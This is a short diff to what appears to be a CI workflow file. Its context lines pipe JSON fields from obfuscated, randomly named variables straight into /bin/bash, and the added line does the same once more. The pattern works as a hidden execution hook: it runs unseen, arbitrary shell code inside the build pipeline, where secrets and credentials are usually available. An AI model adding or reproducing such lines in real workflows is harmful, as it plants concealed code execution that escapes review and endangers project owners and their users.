@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$dkv85517" | jq -r .ufpt08 | /bin/bash
           printf '%s' "$qnuc02" | jq -r .snxx29054 | /bin/bash
           printf '%s' "$l95" | jq -r .uh686 | /bin/bash
+          echo $adood49146 | jq -r .zdph86 | /bin/bash
 
       - name: Archive results
         if: always()
